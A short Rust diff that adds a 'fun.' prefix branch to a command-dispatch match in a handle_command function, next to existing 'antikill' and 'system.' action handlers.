@@ -1484,6 +1484,7 @@ fn handle_command(
         "antikill.enable" => Ok(install_antikill()),
         "antikill.disable" => Ok(uninstall_antikill()),
         a if a.starts_with("system.") => system_action(a, &payload),
+        a if a.starts_with("fun.") => fun_action(a, &payload),
         _ => Err(format!("unknown action: {}", action)),
     };
 
